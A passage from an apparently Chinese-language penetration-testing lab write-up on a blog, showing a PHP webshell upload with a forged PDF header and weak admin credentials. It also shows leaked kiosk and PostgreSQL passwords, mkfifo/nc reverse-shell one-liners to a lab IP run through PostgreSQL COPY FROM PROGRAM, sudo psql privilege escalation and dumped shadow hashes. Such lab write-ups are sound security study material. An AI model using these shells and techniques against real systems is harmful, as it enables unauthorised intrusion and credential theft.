+// PLEASE DO NOT CHANGE WITHOUT UNDERSTANDING THE IMPACT
+//
+// NOTE: Changing this file requires a restart of VS Code.
+{
+        // Use software rendering instead of hardware accelerated rendering.
+        // This can help in cases where you see rendering issues in VS Code.
+        // &quot;disable-hardware-acceleration&quot;: true,
+
+        // Allows to disable crash reporting.
+        // Should restart the app if the value is changed.
+        &quot;enable-crash-reporter&quot;: true,
+
+        // Unique id used for correlating crash reports sent from this instance.
+        // Do not edit this value.
+        &quot;crash-reporter-id&quot;: &quot;23628560-385e-4f74-a188-705111e35e97&quot;
+}
+</code></pre>
+<p>运行 winPEASx64.exe 获取更多信息</p>
+<h2 id="225">225</h2>
+<h3 id="上传-getshell">上传 + Getshell</h3>
+<p>8090 端口目录扫描发现后台<br>
+<img src="https://blog.cxaqhq.cn/post-images/1695256924600.png" alt="" loading="lazy"></p>
+<p>弱口令 admin/admin 进入<br>
+<img src="https://blog.cxaqhq.cn/post-images/1695257032234.png" alt="" loading="lazy"></p>
+<p>上传php 成功，需要伪造PDF文件头，生成php木马并连接，获取机器www权限<br>
+<img src="https://blog.cxaqhq.cn/post-images/1695257744659.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="2"><img src="https://blog.cxaqhq.cn/post-images/1695257062533.png" alt="" loading="lazy"></figure>
+<p>发现特殊PDF文件：user-guide-rdweb.pdf，果然有惊喜</p>
+<pre><code>Log in using “SKYLARK\kiosk” as the username and “XEwUS^9R2Gwt8O914” as the
+password.
+Once logged in, start the “SkylarkStatus” application. Please have this window open at all times
+while making changes in the network. Notify the system administrators if the CPU goes beyond
+80%
+
+使用“SKYLARK\kiosk”作为用户名和“XEwUS^9R2Gwt8O914”登录
+密码。
+登录后，启动“SkylarkStatus”应用程序。请随时打开这个窗口
+在对网络进行更改时。如果CPU超出，请通知系统管理员80%
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://blog.cxaqhq.cn/post-images/1695272340700.png" alt="" loading="lazy"></figure>
+<h3 id="信息收集">信息收集</h3>
+<p>225 机器上还开放21、80端口，寻找配置文件与密码看看能不能有新发现</p>
+<h4 id="21">21</h4>
+<p>很不错，vsftpd 是以Root权限运行，说不定对提权有帮助</p>
+<pre><code>root         862  0.0  0.1   6816  3040 ?        Ss   20:29   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+
+</code></pre>
+<h4 id="80">80</h4>
+<h4 id="postgresql-执行命令">PostgreSql 执行命令</h4>
+<p>发现postgresql 账号密码</p>
+<pre><code>pg_connect(&quot;host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC&quot;);
+</code></pre>
+<p>运行权限</p>
+<pre><code>postgres     954  0.0  1.3 218288 27544 ?        Ss   00:56   0:00 /usr/lib/postgresql/12/bin/postgres -D /var/lib/postgresql/12/main -c config_file=/etc/postgresql/12/main/postgresql.conf
+</code></pre>
+<p>虽然权限是：postgres<br>
+<img src="https://blog.cxaqhq.cn/post-images/1695293411737.png" alt="" loading="lazy"></p>
+<p>反弹shell</p>
+<pre><code>rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.242 1339 &gt;/tmp/x
+</code></pre>
+<p>本地连接pgsql</p>
+<pre><code>psql -h localhost -d webapp -U postgres
+pass: EAZT5EMULA75F8MC
+</code></pre>
+<p>执行命令反弹shell</p>
+<pre><code>DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.242 1339 &gt;/tmp/x';
+SELECT * FROM cmd_exec;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://blog.cxaqhq.cn/post-images/1695293650965.png" alt="" loading="lazy"></figure>
+<p>查看权限<br>
+<img src="https://blog.cxaqhq.cn/post-images/1695293662451.png" alt="" loading="lazy"></p>
+<pre><code>DROP TABLE IF EXISTS cccc;
+CREATE TABLE cccc(cmd_output text);
+COPY cccc FROM PROGRAM 'rm /tmp/cc;mkfifo /tmp/cc;cat /tmp/cc|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.242 4444 &gt;/tmp/cc';
+SELECT * FROM cccc;
+</code></pre>
+<h3 id="提权成功">提权成功</h3>
+<p>以postgres 权限运行linpeas.sh发现关键信息</p>
+<pre><code>sudo psql --host=127.0.0.1 -U postgres  
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://blog.cxaqhq.cn/post-images/1695296105662.png" alt="" loading="lazy"></figure>
+<p>获取交互式Shell</p>
+<pre><code>\! /bin/bash -i
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://blog.cxaqhq.cn/post-images/1695296227653.png" alt="" loading="lazy"></figure>
+<p>账号密码信息</p>
+<pre><code>uploader:$6$c75jCr2ed7SPE7pZ$yJQytoiwkX8.YXt01CTAtTdiPQuVWiuJMZKFYx3c3IJE4oY82XIPlWkglSS526iqIjGKiAVTFB/STVD0EWR7d1:19312:0:99999:7:::
+ftpuploader:$6$MMUAFl7.z9lu9rn2$XJIk94GmRE0G9cxSyrRYxcb/.x5cOGf8Ia9UZCcMXTGqHaomETE2VNc0RMjyKijATV1EUmR09raBcup2gF5tm/:19312:0:99999:7:::
+root:$6$T9BeQnAFRJ9BLiXL$79gDZF2EgfgrapdqjVN/Hi.w1e9BfC.iadURcNzR1naWR73OyHuz3IHP4iqx0dsjvyVJcAoGaoBYYnOVMdD2O/:19311:0:99999:7:::
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE">网络拓扑图</a>
+<ul>
+<li><a href="#192">192</a></li>
+<li><a href="#172">172</a></li>
+<li><a href="#10">10</a></li>
+<li><a href="#250">250</a></li>
+</ul>
+</li>
+<li><a href="#225">225</a>
+<ul>
+<li><a href="#%E4%B8%8A%E4%BC%A0-getshell">上传 + Getshell</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#21">21</a></li>
+<li><a href="#80">80</a></li>
+<li><a href="#postgresql-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">PostgreSql 执行命令</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F">提权成功</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
